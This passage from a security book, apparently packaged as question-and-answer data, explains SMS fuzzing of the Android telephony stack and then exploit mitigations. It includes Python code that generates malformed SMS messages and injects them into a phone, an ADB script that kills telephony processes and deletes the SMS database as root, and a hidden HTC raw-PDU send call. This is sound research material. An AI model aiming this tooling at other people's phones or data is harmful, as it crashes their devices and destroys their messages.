unsolicited response. This is how SMS\nmessages are delivered from the baseband to the telephony stack. Incoming voice\ncalls are signaled in the same way. The following is an example of an AT unso-\nlicited response, sniffed using the Injectord tool, for an incoming SMS message:\n+CMT: ,53\n0891945111325476F8040D91947187674523F10000012\n0404143944025C8721EA47CCFD1F53028091A87DD273A88FC06D1D16510BDCC1EBF41F437399C07\nThe fi rst line is the unsolicited response name, +CMT, followed by the size of\nthe message in octets. The second line contains the message in hexadecimal\nencoding. The telephony stack then issues an AT command to let the baseband\nknow that the unsolicited response was received.\nFuzzing SMS on Android\nNow that you know how the Android telephony stack and rild work, you can\nuse this knowledge to fuzz SMS on Android. Based on your knowledge of the\nSMS format, you generate SMS message test cases. Next, you use Injectord’s\nmessage injection feature to deliver the test cases to your target phone. Besides\nmessage injection, you also need to monitor your target phone for crashes. After\nyou have collected crash logs, you have to analyze and verify the crashes. This\nsection shows you how to perform all of these steps.\nGenerating SMS Messages\nNow that you know what the SMS message format looks like, you can start gen-\nerating SMS messages to fuzz the Android telephony stack. Chapter 6 already\nprovides an introduction to fuzzing; therefore, this chapter only discusses\nnotable differences relevant to SMS fuzzing.\nSMS is an excellent example of when additional domain knowledge is neces-\nsary for developing a fuzzer. Many fi elds in an SMS message cannot contain\nbroken values because SMS messages are inspected by the SMSC as they are\ntransmitted inside the mobile operator infrastructure. Broken fi elds lead the\nSMSC to not accept the message for delivery.\nc11.indd 02:37:57:PM 02/24/2014 Page 382\nChapter 11 ■ Attacking the Radio Interface Layer 383\nThe following information looks at a fuzzer for the UDH that was previously\nintroduced. The UDH has a simple TLV format, and, therefore, is perfect for a\nsmall exercise. The following Python script shown is based on an open source\nlibrary for creating SMS messages. This library is available with the book mate-\nrials and from http://www.mulliner.org/security/sms/. It generates SMS\nmessages that contain between one and ten UDH elements. Each element is\nfi lled with a random type and random length. The remaining message body is\nfi lled up with random data. The resulting messages are saved to a fi le and sent\nto the target later. All of the necessary imports required to run this script are\nincluded in the SMS library.\n#!/usr/bin/python\nimport os\nimport sys\nimport socket\nimport time\nimport Utils\nimport sms\nimport SMSFuzzData\nimport random\nfrom datetime import datetime\nimport fuzzutils\ndef udhrandfuzz(msisdn, smsc, ts, num):\ns = sms.SMSToMS()\ns._msisdn = msisdn\ns._msisdn_type = 0x91\ns._smsc = smsc\ns._smsc_type = 0x91\ns._tppid = 0x00\ns._tpdcs = random.randrange(0, 1)\nif s._tpdcs == 1:\ns._tpdcs = 0x04\ns._timestamp = ts\ns._deliver = 0x04\ns.deliver_raw2flags()\ns._deliver_udhi = 1\ns.deliver_flags2raw()\ns._msg = \"\"\ns._msg_leng = 0\ns._udh = \"\"\nfor i in range(0,num):\ntu = chr(random.randrange(0,0xff))\ntul = random.randrange(1,132)\nif s._udh_leng + tul > 138:\nbreak\ntud = SMSFuzzData.getSMSFuzzData()\ns._udh = s._udh + tu + chr(tul) + tud[:tul]\ns._udh_leng = len(s._udh)\nif s._udh_leng > 138:\nc11.indd 02:37:57:PM 02/24/2014 Page 383\n384 Chapter 11 ■ Attacking the Radio Interface Layer\nbreak\ns._msg_leng = 139 - s._udh_leng\nif s._msg_leng > 0:\ns._msg_leng = random.randrange(int(s._msg_leng / 2), s._msg_leng)\nif s._msg_leng > 0:\ntud = SMSFuzzData.getSMSFuzzData()\ns._msg = tud[:s._msg_leng]\nelse:\ns._msg_leng = 0\ns.encode()\nreturn s._pdu\nif __name__ == \"__main__\":\nout = []\nfor i in range(0, int(sys.argv[1])):\nts = Utils.hex2bin(\"99309251619580\", 0)\nrnd = random.randrange(1,10)\nmsg = udhrandfuzz(\"4917787654321\", \"49177123456\", ts, rnd)\nline = Utils.bin2hex(msg, 1)\nleng = (len(line) / 2) - 8\nout.append((line, leng))\nfuzzutils.cases2file(out, sys.argv[2])\nThe following are some example messages from our random UDH generator\nscript. The messages can be sent to any phone running Injectord as described\nin the next section.\n07919471173254F6440D91947187674523F1784699309251619580837AF\n3142227222722272227222722272227222722272227E2623B3B3B3B3B3B\n3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B\n3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B\n3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B\n3B3B8EBBA78E928494C6 151\n07919471173254F6440D91947187674523F138EA993092516195808A744E72606060606060606060\n60606060606060606060606060606060606060606060606060606060606060606060606060606060\n60606060606060606060606060606060606060606060606060606060606060606060606060606060\n60606060606060606060606060606060606060606060606060181818181818181818181818181818\n181818181818 158\n07919471173254F6440D91947187674523F1DE76993092516195806D392B375E5E5E5E5E5E5E5E5E\n5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E5E\n5E5E5E5E5E5E1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F\n1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F1F 129\n07919471173254F6440D91947187674523F10BA3993092516195807F337B293B3B3B3B3B3B3B3B3B\n3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3B3BD0060F0F0F0F0F0F\n5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C\n5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C 147\nc11.indd 02:37:57:PM 02/24/2014 Page 384\nChapter 11 ■ Attacking the Radio Interface Layer 385\nInjecting SMS Messages Using Injectord\nMessage injection works as in the following manner. Injectord listens on TCP port\n4242 and expects a complete +CMT message consisting of two lines of text: +CMT\nand length on the fi rst line and the hex-encoded SMS message on the second\nline. The message is injected into the fake serial device used by rild. When the\nmessage is received, rild issues an answer to the modem to acknowledge the\nmessage. In order to avoid confusing the modem, Injectord blocks the acknowl-\nedgement command.\nThe following code presents a simple Python program to send an SMS mes-\nsage to Injectord running on the HTC One V Android smartphone. The sendmsg\nmethod takes the destination IP address, message contents, message length (that\nis used for the +CMT response), and the Carriage Return Line Feed (CRLF) type.\nThe AT command set is a line-based protocol; each line has to be terminated\nto signal that a command is complete and ready to be parsed. The termination\ncharacter is either a Carriage Return (CR) or a Line Feed (LF). Different modems\nexpect a different combination of CRLF for the AT communication.\n# use crlftype = 3 for HTC One V\ndef sendmsg(dest_ip, msg, msg_cmt, crlftype = 1):\nerror = 0\nif crlftype == 1:\nbuffer = \"+CMT: ,%d\\r\\n%s\\r\\n\" % (msg_cmt, msg)\nelif crlftype == 2:\nbuffer = \"\\n+CMT: ,%d\\n%s\\n\" % (msg_cmt, msg)\nelif crlftype == 3:\nbuffer = \"\\n+CMT: ,%d\\r\\n%s\\r\\n\" % (msg_cmt, msg)\nso = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ntry:\nso.connect((dest_ip, 4223))\nexcept:\nerror = 1\ntry:\nso.send(buffer)\nexcept:\nerror = 2\nso.close()\nreturn error\nMonitoring the Target\nFuzzing without monitoring the target is useless because you cannot catch the\ncrashes by looking at the phone’s screen. In addition, you want to be able to fuzz\nfully automated and only look at the test cases that triggered a crash of some\nsort. In order to do this you have to be able to monitor the phone while you\nfuzz. In addition, you want to reset the SMS application from time to time to\nc11.indd 02:37:57:PM 02/24/2014 Page 385\n386 Chapter 11 ■ Attacking the Radio Interface Layer\nminimize side effects, including crashes resulting from reprocessing previous\ntest cases. Using Android Debug Bridge (ADB), you can monitor an Android\nphone for crashes, including the Telephony and SMS stack. The basic idea works\nas follows. You send an SMS message using the Python sendmsg, which sends\nthe SMS message to Injectord running on the phone. After the SMS is injected,\nyou inspect the Android system log using ADB’s logcat command. If the log\ncontains a native crash or Java exception, you save the logcat output and the\nSMS message for the current test case. After each test case, you clear the system\nlog and continue with the next test case. After every 50 SMS messages, you\ndelete the SMS database and restart the SMS program on the Android phone.\nThe following Python code implements this algorithm.\n#!/usr/bin/python\nimport os\nimport time\nimport socket\ndef get_log(path = \"\"):\ncmd = path + \"adb logcat -d\"\nl = os.popen(cmd)\nr = l.read()\nl.close()\nreturn r\ndef clean_log(path = \"\"):\ncmd = path + \"adb logcat -c\"\nc = os.popen(cmd)\nbla = c.read()\nc.close()\nreturn 1\ndef check_log(log):\ne = 0\nif log.find(\"Exception\") != -1:\ne = 1\nif log.find(\"EXCEPTION\") != -1:\ne = 1\nif log.find(\"exception\") != -1:\ne = 1\nreturn e\ndef kill_proc(path = \"\", name = \"\"):\ncmd = path + \"adb shell \\\"su -c busybox killall -9 \" + name + \"\\\"\"\nl = os.popen(cmd)\nr = l.read()\nl.close()\nreturn r\ndef clean_sms_db(path = \"\"):\ncmd = path + \"adb shell \\\"su -c rm \"\nc11.indd 02:37:57:PM 02/24/2014 Page 386\nChapter 11 ■ Attacking the Radio Interface Layer 387\ncmd = cmd + \"/data/data/com.android.providers.telephony\"\ncmd = cmd + \"/databases/mmssms.db\\\"\"\nl = os.popen(cmd)\nr = l.read()\nl.close()\nreturn r\ndef cleanup_device(path = \"\"):\nclean_sms_db(path)\nkill_proc(path, \"com.android.mms\")\nkill_proc(path, \"com.android.phone\")\ndef log_bug(filename, log, test_case):\nfp = open(filename, \"w\")\nfp.write(test_case)\nfp.write(\"\\n*-------------------------\\n\")\nfp.write(log)\nfp.write(\"\\n\")\nfp.write(\"\\n-------------------------*\\n\")\nfp.close()\ndef file2cases(filename):\nout = []\nfp = open(filename)\nline = fp.readline()\nwhile line:\ncr = line.split(\" \")\nout.append((cr[0], int(cr[1].rstrip(\"\\n\"))))\nline = fp.readline()\nfp.close()\nreturn out\ndef sendcases(dest_ip, cases, logpath, cmdpath = \"\", crlftype = 1, delay = 5,\nstatus = 0, start = 0):\ncount = 0\ncleaner = 0\nfor i in cases:\nif count >= start:\n(line, cmt) = i\nerror = sendmsg(dest_ip, line, cmt, crlftype)\nif status > 0:\nprint \"%d) error=%d data: %s\" % (count, error, line)\ntime.sleep(delay)\nl = get_log(cmdpath)\n#print l\nif check_log(l) == 1:\nlout = line + \" \" + str(cmt) + \"\\n\\n\"\nlog_bug(logpath + str(time.time()) + \".log\", l, lout)\nclean_log(cmdpath)\ncount = count + 1\ncleaner = cleaner + 1\nif cleaner >= 50:\ncleanup_device(cmdpath)\nc11.indd 02:37:57:PM 02/24/2014 Page 387\n388 Chapter 11 ■ Attacking the Radio Interface Layer\ncleaner = 0\ndef sendcasesfromfile(filename, dest_ip, cmdpath = \"\", crlftype = 1, delay = 5,\nlogpath = \"./logs/\", status = 0, start = 0):\ncases = file2cases(filename)\nsendcases(dest_ip, cases, logpath, cmdpath, crlftype = crlftype,\ndelay = delay, status = status, start = start)\nif __name__ == \"__main__\":\nfn = os.sys.argv[1]\ndest = os.sys.argv[2]\nstart = 0\nif len(os.sys.argv) > 3:\nstart = int(os.sys.argv[3])\nprint \"Sending test cases from %s to %s\" % (fn, dest)\nsendcasesfromfile(fn, dest, cmdpath = \"\", crlftype = 3, status = 1,\nstart = start)\nFollowing is an example crash log that was saved by the fuzz monitoring\nscript. The dump shows a NullPointerException in the SmsReceiverService. In\nthe best case, you would fi nd a bug that triggers a native crash in rild itself.\nV/SmsReceiverService(11360): onStart: #1 mResultCode: -1 = Activity.RESULT_OK\nV/UsageStatsService(11473): CMD_ID_UPDATE_MESSAGE_USAGE\nV/SmsReceiverService( 6116): onStart: #1, @1090741600\nE/NotificationService( 4286): Ignoring notification with icon==0: Notification\n(contentView=null vibrate=null,sound=nullnull,defaults=0x0,flags=0x62)\nD/SmsReceiverService( 6116): isCbm: false\nD/SmsReceiverService( 6116): isDiscard: false\nD/SmsReceiverService( 6116): [HTC_MESSAGES] - SmsReceiverService:\nhandleSmsReceived()\nW/dalvikvm(11360): threadid=12: thread exiting with uncaught exception\n(group=0x40a9e228)\nD/SmsReceiverService( 6116): isEvdo: false before inserMessage\nD/SmsReceiverService( 6116): sms notification lock\nE/AndroidRuntime(11360): FATAL EXCEPTION: SmsReceiverService\nE/AndroidRuntime(11360): java.lang.NullPointerException\nE/AndroidRuntime(11360): at com.concentriclivers.mms.com.android.mms.\ntransaction.SmsReceiverService.replaceFormFeeds\n(SmsReceiverService.java:512)\nE/AndroidRuntime(11360): at com.concentriclivers.mms.com.android.mms.\ntransaction.SmsReceiverService.storeMessage\n(SmsReceiverService.java:527)\nE/AndroidRuntime(11360): at com.concentriclivers.mms.com.android.mms.\ntransaction.SmsReceiverService.insertMessage\n(SmsReceiverService.java:443)\nE/AndroidRuntime(11360): at com.concentriclivers.mms.com.android.mms.\ntransaction.SmsReceiverService.handleSmsReceived\n(SmsReceiverService.java:362)\nE/AndroidRuntime(11360): at com.concentriclivers.mms.com.android.mms.\ntransaction.SmsReceiverService.access$1(SmsReceiverService.java:359)\nc11.indd 02:37:57:PM 02/24/2014 Page 388\nChapter 11 ■ Attacking the Radio Interface Layer 389\nE/AndroidRuntime(11360): at com.concentriclivers.mms.com.android.mms.\ntransaction.SmsReceiverService$ServiceHandler.handleMessage\n(SmsReceiverService.java:208)\nE/AndroidRuntime(11360): at android.os.Handler.dispatchMessage(Handler.\njava:99)\nE/AndroidRuntime(11360): at android.os.Looper.loop(Looper.java:154)\nE/AndroidRuntime(11360): at android.os.HandlerThread.run(HandlerThread.\njava:60)\nD/SmsReceiverService( 6116): smsc time: 03/29/99, 8:16:59am, 922713419000\nD/SmsReceiverService( 6116): device time: 01/21/13, 6:20:01pm, 1358810401171\nE/EmbeddedLogger( 4286): App crashed! Process: com.concentriclivers.mms.com.\nandroid.mms\nE/EmbeddedLogger( 4286): App crashed! Package: com.concentriclivers.mms.com.\nandroid.mms v3 (4.0.3)\nE/EmbeddedLogger( 4286): Application Label: Messaging\nVerifying Fuzzing Results\nThe described fuzzing method has one minor drawback. Each SMS message\nthat produces a crash has to be verifi ed using a real cellular network because\nyou might have generated SMS messages that are not accepted by a real SMSC.\nTo test if a given message is accepted by a real SMSC, you simply try to send\nthe given test case to another phone. Note that the generated SMS messages\nare in the SMS-Deliver format. To be able to send a given test case to another\nphone, it has to be converted to the SMS-Submit format. We experimented with\ntwo approaches for this test. One approach is sending the SMS message using\nan online service (such as www.routomessaging.com and www.clickatel.com).\nMost SMS online services have a simple HTTP-based API and are easy to use.\nAnother, more straightforward approach is to send the test case SMS message\nfrom one phone to another phone.\nOn Android, this can be a little complicated as the Android SMS API does not\nsupport raw PDU messages. However, there are two workarounds that enable\nyou to send raw PDU messages. The fi rst workaround involves sending SMS\nmessages directly using the GSM AT command AT+CMGS. This is possible if the\nmodem-to-RIL communication is carried out using AT commands. You can do\nthis by modifying Injectord to allow sending the CMGS command to the modem.\nThe second workaround works on HTC Android phones only. HTC added\nfunctionality to send raw PDU SMS messages through the Java API. The API\nis hidden and you need to use Java refl ection in order to use it. The following\ncode implements sending raw PDU messages on HTC Android phones.\nvoid htc_sendsmspdu(byte pdu[])\n{\ntry {\nSmsManager sm = SmsManager.getDefault();\nbyte[] bb = new byte[1];\nMethod m = SmsManager.class.getDeclaredMethod (\"sendRawPdu\",\nc11.indd 02:37:57:PM 02/24/2014 Page 389"
  },
  {
    "input": "What is the main topic of this chapter?",
    "summary": "This chapter explains the Android telephony stack, focusing on the Radio Interface Layer (RIL) and how hardware manufacturers integrate their cellular hardware into the Android framework. It also covers fuzz testing the SMS subsystem, including how to generate SMS messages and use ADB to monitor the telephony stack for crashes. The chapter provides tools and knowledge for conducting hacking experiments on the Android RIL.",
    "output": "390 Chapter 11 ■ Attacking the Radio Interface Layer\nbb.getClass(),\nbb.getClass(), PendingIntent.class, PendingIntent.class, boolean.class,\nboolean.class);\nm.setAccessible(true);\nm.invoke(sm, null, pdu, null, null, false, false);\n} catch (Exception e) {\ne.printStackTrace();\n}\n}\nSummary\nIn this chapter, you read about the Android telephony stack. In particular you\nfound out much of what there is to know about the Radio Interface Layer (RIL).\nYou examined basic RIL functionality and what hardware manufacturers must\ndo to integrate their cellular hardware into the Android Framework. Based on\nthis, you discovered how to monitor the communication between the Android\nRIL and the cellular modem hardware.\nIn the second half of this chapter, you received instruction on how to fuzz test\nthe SMS message subsystem of an Android device. In the process you found out\na bit about the SMS message format and how to build an SMS message genera-\ntor SMS for fuzzing. This chapter also showed you how to use ADB to monitor\nthe telephony stack of an Android device for crashes. Altogether, this chapter\nenables you to carry out your own hacking experiments on the Android RIL\nsubsystem.\nThe next chapter covers all of the many exploit mitigation techniques that\nhave been employed to help secure the Android platform. Each technique is\nexplained in detail, including historical facts and inner workings.\nc11.indd 02:37:57:PM 02/24/2014 Page 390"
  },
  {
    "input": "What are the key exploit mitigation techniques discussed in the chapter and how do they apply to the Android operating system?",
    "summary": "This chapter discusses modern exploit mitigations and their implementation in the Android operating system. It covers various techniques such as code signing, heap hardening, integer overflow prevention, data execution prevention, and address space layout randomization, explaining how they are applied or adapted in Android. The chapter also explores how Android has evolved its security measures over time, including the adoption of features like SELinux and the use of the FORTIFY_SOURCE mitigation, while noting the challenges in implementing these protections. Finally, it looks ahead to potential future improvements in Android's exploit mitigation strategies.",
    "output": "CHAPTER\n12\nExploit Mitigations\nIn the exploit research community, an arms race is ongoing between offensive\nand defensive researchers. As successful attacks are published or discovered,\ndefensive researchers aim to disrupt similar attacks from succeeding in the future.\nTo do this, they design and implement exploit mitigations. When a new mitigation\nis fi rst introduced, it disrupts the offensive community. Offensive researchers\nmust then devise new techniques to work around the newly added protection.\nAs researchers develop these techniques and publish them, the effectiveness\nof the technique decreases. Defensive researchers then return to the drawing\nboard to design new protections, and so the cycle continues.\nThis chapter discusses modern exploit mitigations and how they relate to the\nAndroid operating system. The chapter fi rst explores how various mitigations\nfunction from a design and implementation point of view. Then it presents a\nhistorical account of Android’s support for modern mitigations, providing code\nreferences when available. Next, the chapter discusses methods for intention-\nally disabling and overcoming exploit mitigations. Finally, the chapter wraps\nup by looking forward at what exploit mitigation techniques the future might\nbring to Android.\n391\nc12.indd 01:23:44:PM 02/24/2014 Page 391\n392 Chapter 12 ■ Exploit Mitigations\nClassifying Mitigations\nModern operating systems use a variety of exploit mitigation techniques for\nenhanced protection against attacks. Many of these techniques aim squarely\nat preventing the exploitation of memory corruption exploits. However, some\ntechniques try to prevent other methods of compromise, such as symbolic\nlink attacks. Adding mitigation techniques to computer systems makes them\nmore diffi cult, and thus more expensive, to attack than they would be without\nmitigations.\nImplementing exploit mitigations requires making changes to various compo-\nnents of the system. Hardware-assisted mitigation techniques perform very well,\nbut they often require hardware changes within the processor itself. Additionally,\nmany techniques, including hardware-assisted methods, require additional\nsoftware support in the Linux kernel. Some mitigation techniques require\nchanging the runtime library and/or compiler tool chain.\nThe exact modifi cations needed for each technique carry advantages and\ndisadvantages along with them. For hardware-assisted mitigations, changing\nan instruction set architecture (ISA) or underlying processor design can be\nexpensive. Also, deploying new processors may take an extended period of time.\nModifying the Linux kernel or runtime libraries is relatively easy compared to\nchanging a processor design, but building and deploying updated kernels is\nstill required. As mentioned previously in Chapter 1, updating operating system\ncomponents has proven to be a challenge in the Android ecosystem. Techniques\nthat require changes to the compiler tool chain are even worse. Deploying them\nrequires rebuilding—often with special fl ags—each program or library that is\nto be protected. Techniques that rely only on changing the operating system are\npreferred because they typically apply system wide. On the contrary, compiler\nchanges only apply to programs compiled with mitigation enabled.\nIn addition to all of the aforementioned pros and cons, performance is a\nmajor concern. Some security professionals argue that protecting end users is\nworth a performance cost, but many disagree. Numerous mitigations were not\nadopted initially, or in some cases ever, due to the unsatisfactory performance\nincrease associated with them.\nWithout further ado, it’s time to examine some specifi c mitigation techniques\nand see how they apply to the Android operating system.\nCode Signing\nVerifying cryptographic signatures is one mechanism used to prevent execut-\ning unauthorized code, often called code signing. Using public key cryptography,\ndevices can use a public key to verify that a particular private key (held by a\nc12.indd 01:23:44:PM 02/24/2014 Page 392\nChapter 12 ■ Exploit Mitigations 393\ntrusted authority) signed a piece of code. Although Android doesn’t utilize\ncode signing to the extent that iOS and OS X do, it utilizes signature checking\nextensively. It is used in areas such as TrustZone, locked boot loaders, over-the-\nair updates, applications, and more. Due to the fragmented nature of Android,\nexactly what is and isn’t verifi ed varies from device to device.\nThe most widespread use of code signing in Android pertains to locked boot\nloaders. Here, the lowest-level boot loaders verify that subsequent boot stages\ncome from a trusted source. The general idea is to verify a chain of trust all the\nway to the lowest-level boot loader, which is usually stored in a boot read-only\nmemory (ROM) chip. On some devices, the last stage boot loader verifi es the\nkernel and initial random-access memory (RAM) disk. Only a few devices, such\nas Google TV devices, go so far as to verify signatures on kernel modules. In\naddition to verifying signatures at boot time, some devices implement signature\nchecking when fl ashing fi rmware. One item that is sometimes checked during\nfl ashing is the /system partition. Again, the exact devices that implement this\nprotection vary. Some devices verify signatures only at boot, some verify dur-\ning fl ashing, and some do both.\nApart from the boot process, code signing is also used to verify over-the-air\nupdates. OTA updates come in the form of a zip fi le containing patches, new\nfi les, and required data. Typically, updates are applied by rebooting into recov-\nery mode. In this mode, the recovery image handles verifying and installing\nthe update. The content of the zip fi le is cryptographically signed by a trusted\nauthority — and later verifi ed — to prevent malicious fi rmware attacks. For\nexample, the default recovery image on Nexus devices refuses to apply updates\nunless they are signed by Google.\nAndroid applications employ code signing, but the signature used doesn’t\nchain back to a trusted root authority. Rather than have all applications signed\nby a trusted source as Apple does for iOS apps, Google requires that developers\nself-sign their apps before they can appear in the Google Play store. Not chain-\ning back to a trusted root authority means end users must rely on community\nreputation to determine trust. The existence of an app in the Play store alone\nprovides little indication of whether or not the app, or its developer, is trustworthy.\nThough Android does use code-signing mechanisms extensively, the pro-\ntection it provides pales in comparison to that of iOS. All of the previously\ndescribed mechanisms also apply to iOS in some way. The thing that sets iOS\napart is that Apple uses code signing to enforce whether memory regions can\nbe executed. Code can only be executed if it has been approved by Apple. This\nprevents downloading and executing, or injecting, new code after an applica-\ntion passes the approval process. The only exception is a single memory region\nmarked with read, write, and execute permissions, which is used for just-in-\ntime (JIT) compiling in the browser. When combined with other mitigations,\nApple’s code signing makes traditional memory corruption attacks surprisingly\nc12.indd 01:23:44:PM 02/24/2014 Page 393\n394 Chapter 12 ■ Exploit Mitigations\ndiffi cult. Because Android does not enforce code signing this way, it does not\nbenefi t from the protection such a technique provides. Memory trespass attacks\nand downloading and executing new code after installation are both possible.\nThe other mitigation techniques presented in this chapter help to prevent some\nexploits from working, but Trojan attacks remain unaffected.\nHardening the Heap\nAround the time that the fi rst mitigations targeting stack-based buffer overfl ow\nvulnerabilities were introduced, heap overfl ows rose to popularity. In 1999,\nMatthew Conover of the w00w00 security team published a text fi le called\nheaptut.txt. The original text can be found at http://www.cgsecurity.org/\nexploit/heaptut.txt. This document served as an introduction of the possi-\nbilities of what heap-based memory corruption could allow. Later publications\ndug deeper and deeper, covering exploitation techniques specifi c to certain heap\nimplementations or applications. Despite the amount of existing material, heap\ncorruption vulnerabilities are still commonplace today.\nAt a high level, there are two main approaches to exploiting heap corrup-\ntions. The fi rst method involves targeting application-specifi c data to leverage\narbitrary code execution. For example, an attacker may attempt to overwrite\na security critical fl ag or data used to execute shell commands. The second\nmethod involves exploiting the underlying heap implementation itself, usually\nmetadata used by the allocator. The classic unlink technique is an example of\nthis approach, but many more attacks have been devised since. This second\nmethod is more popular because such attacks can be applied more generically\nto exploit individual vulnerabilities across an entire operating system or family\nof operating system versions. How these attacks are mitigated vary from one\nheap implementation to the next.\nAndroid uses a modified version of Doug Lea’s memory allocator, or\ndlmalloc for short. The Android-specifi c modifi cations are minor and are not\nrelated to security. However, the upstream version of dlmalloc used (2.8.6) at\nthe time of this writing does contain several hardening measures. For example,\nexploits using the classic unlink attack are not possible without additional effort.\nChapter 8 covers further details of how these mitigations work in Android.\nAndroid has included a hardened version of dlmalloc since its fi rst public release.\nProtecting Against Integer Overfl ows\nInteger overfl ow vulnerabilities, or integer overfl ows for short, are a type of\nvulnerability that can result in many different types of unwanted behavior.\nModern computers use registers that are of fi nite size, usually 32 bit or 64 bit,\nc12.indd 01:23:44:PM 02/24/2014 Page 394\nChapter 12 ■ Exploit Mitigations 395\nto represent integer values. When an arithmetic operation occurs that exceeds\nthis fi nite space, the excess bits are lost. The portion that does not exceed the\nspace remains. This is called modular arithmetic. For example, when the two\nnumbers 0x8000 and 0x20000 are multiplied, the result is 0x100000000. Because\nthe maximum value of a 32-bit register is 0xffffffff, the uppermost bit would not\nfi t in the register. Instead the result value would be 0x00000000. Though integer\noverfl ows can cause crashes, incorrect price calculations, and other issues, the\nmost interesting consequence is when memory corruption occurs. For example,\nwhen such a value is passed to a memory allocation function, the result is a\nbuffer far smaller than what was expected.\nOn August 5, 2002, long time security researcher Florian Weimer notifi ed\nthe then-popular Bugtraq mailing list of a serious vulnerability in the calloc\nfunction of various C runtime libraries. This function takes two parameters: a\nnumber of elements and the size of one element. Internally, it multiplies these\ntwo values and passes the result to the malloc function. The crux of the issue\nwas that vulnerable C runtime libraries did not check if integer overfl ow had\noccurred when multiplying. If the multiplication result was larger than a 32-bit\nnumber, the function returned a much smaller buffer than what the caller\nexpected. The issue was fi xed by returning NULL if integer overfl ow occurred.\nThe Android Security Team ensured that this fi x was implemented prior to\nthe fi rst release of Android. All versions of Android are protected against this\nissue. In the Android security-related documentation, changes to calloc are\ntouted as security enhancement. Most security researchers would consider it\na success in not re-introducing a previously well-known vulnerability rather\nthan an “enhancement.” That said, this particular issue was never assigned a\nCommon Vulnerabilities and Exposures (CVE) identifi er! We don’t really see\nthis as an exploit mitigation, but it was included here for completeness.\nAndroid attempts a more holistic approach to avoiding integer overfl ows by\nincluding a library developed by Google Chrome OS developer Will Drewry\ncalled safe_iop. The name is short for “safe integer operations.” It includes special\narithmetic functions that return failure when an integer overfl ow occurs. This\nlibrary is designed to be used for sensitive integer operations, in lieu of the\nlanguage-intrinsic arithmetic operators. Examples include calculating the size\nof a block of dynamic memory or incrementing a reference counter. Android\nhas included this library since the very fi rst release.\nDuring the course of writing this book, we investigated Android’s use of\nsafe_iop in further detail. We examined Android 4.2.2, the latest release at the\ntime of this writing. We found only fi ve source fi les included the safe_iop header.\nTaking a deeper look, we looked for references to the safe_add, safe_mul, and\nsafe_sub functions provided by the library. Each function is referenced fi ve,\ntwo, and zero times, respectively. Primarily these uses lie in Bionic’s libc, the\nstock recovery’s minzip, and Dalvik’s libdex. Further, Android’s version appears\nto be out of date. The current upstream version is 0.4.0 with several commits on\nc12.indd 01:23:44:PM 02/24/2014 Page 395\n396 Chapter 12 ■ Exploit Mitigations\nthe way to 0.5.0. An AOSP commit references version 0.3.1, which is the current\nrelease version. However, the safe_iop.h header fi le does not contain version\n0.3.1 in the change log. Overall this is somewhat disappointing given the benefi t\nwidespread use of such a library could have.\nPreventing Data Execution\nOne common exploit-mitigation technique used by modern systems aims to\nprevent attackers from executing arbitrary code by preventing the execution\nof data. Machines based on the Harvard architecture contain this protection\ninherently. Those systems physically separate memory that holds code from\nmemory that holds data. However, very few systems, including ARM-based\ndevices, use that architecture in its pure form.\nInstead, modern systems are based on a modifi ed Harvard architecture or\nthe Von Neumann architecture. These architectures allow code and data to\ncoexist in the same memory, which enables loading programs from disk and\neases software updates. Because these tasks are crucial to the convenience of\na general-purpose computer, systems can only partially enforce code and data\nseparation. When designing this mitigation, researchers chose to focus on the\nexecution of data specifi cally.\nIn 2000 and 2002, pipacs of the PaX team pioneered two techniques to prevent\nexecuting data on the i386 platform. Because the i386 platform does not allow\nmarking memory as non-executable in its page tables, these two software-only\ntechniques abused rarely used hardware features. In 2000, PaX included a tech-\nnique called PAGEEXEC. This technique uses the Translation Lookaside Buffer\n(TLB) caching mechanism present in those central processing units (CPUs) to\nblock attempts to execute data. In 2002, PaX added the SEGMEXEC technique.\nThis approach uses the segmentation features of i386 processors to split user-\nspace memory into two halves: one for data and one for code. When fetching\ninstructions from memory stored only in the data area, a page fault occurs that\nallows the kernel to prevent data from executing. Though PaX struggled with\nwide adoption, a variant of the SEGMEXEC technique was included in many\nLinux distributions as exec-shield. These techniques predate, and very likely\ninspired, the modern techniques used to prevent executing data.\nModern devices use a combination of hardware and software support to prevent\nexecuting data. Current ARM and x86 processors support this feature, though\neach platform uses slightly different terminology. AMD introduced hardware\nsupport for Never Execute (NX) in AMD64 processors such as the Athlon 64\nand Opteron. Later, Intel included support for Execute Disable (XD) in Pentium\n4 processors. ARM added support for Execute Never (XN) in ARMv6. The HTC\nDream, also known as G1 or ADP1, used this processor design.\nc12.indd 01:23:44:PM 02/24/2014 Page 396\nChapter 12 ■ Exploit Mitigations 397\nIn both ARM and x86 architectures, the operating system kernel must sup-\nport using the feature to denote that certain areas of memory should not be\nexecutable. If a program attempts to execute such an area of memory, a proces-\nsor fault is generated and delivered to the operating system kernel. The kernel\nthen handles the fault by delivering a signal to the offending process, which\nusually causes it to terminate.\nThe Linux kernel marks the stack memory of a program as executable unless it\nfi nds a GNU_STACK program header without the executable fl ag set. This program\nheader is inserted into the binary by the compiler tool chain when compiled\nwith the -znoexecstack option. If no such program header exists, or one exists\nwith the executable fl ag set, the stack is executable. As a side effect, all other\nreadable mappings are executable as well.\nDetermining whether a particular binary contains such a program header\ncan be accomplished using either the execstack or readelf programs. These\nprograms are available on most Linux distributions and are also included in the\nAndroid Open Source Project (AOSP) repository. The following excerpt shows\nhow to query the executable stack status of a given binary using each program.\ndev:~/android $ execstack -q cat*\n? cat-g1\n- cat-gn-takju\nX cat-gn-takju-CLEARED\ndev:~/android $ readelf -a cat-g1 | grep GNU_STACK\ndev:~/android $ readelf -a 